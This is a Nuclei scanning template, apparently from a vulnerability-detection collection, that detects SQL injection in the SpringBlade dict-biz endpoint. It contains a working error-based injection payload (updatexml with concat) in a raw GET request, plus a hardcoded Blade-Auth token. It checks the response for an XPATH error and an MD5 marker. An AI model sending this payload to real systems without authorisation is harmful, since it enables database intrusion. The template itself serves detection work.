id: springblade-dict-biz-sqli
info:
  name: SpringBlade dict-biz SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template detects an SQL injection vulnerability in the SpringBlade dict-biz endpoint by sending a crafted payload and checking for specific error messages and responses.

variables:
  t1: "{{rand_int(1, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        GET /api/blade-system/dict-biz/list?updatexml(1,concat(0x7e,md5({{t1}}),0x7e),1)=1 HTTP/1.1
        Host: {{Hostname}}
        Blade-Auth: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9..wxB9etQp2DUL5d3-VkChwDCV3Kp-qxjvhIF_aD_beF_KLwUHV7ROuQeroayRCPWgOcmjsOVq6FWdvvyhlz9j7A
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "XPATH syntax error"
          - "{{substr(t2, 0, 31)}}"
      - type: word
        part: header
        words:
          - "application/json"
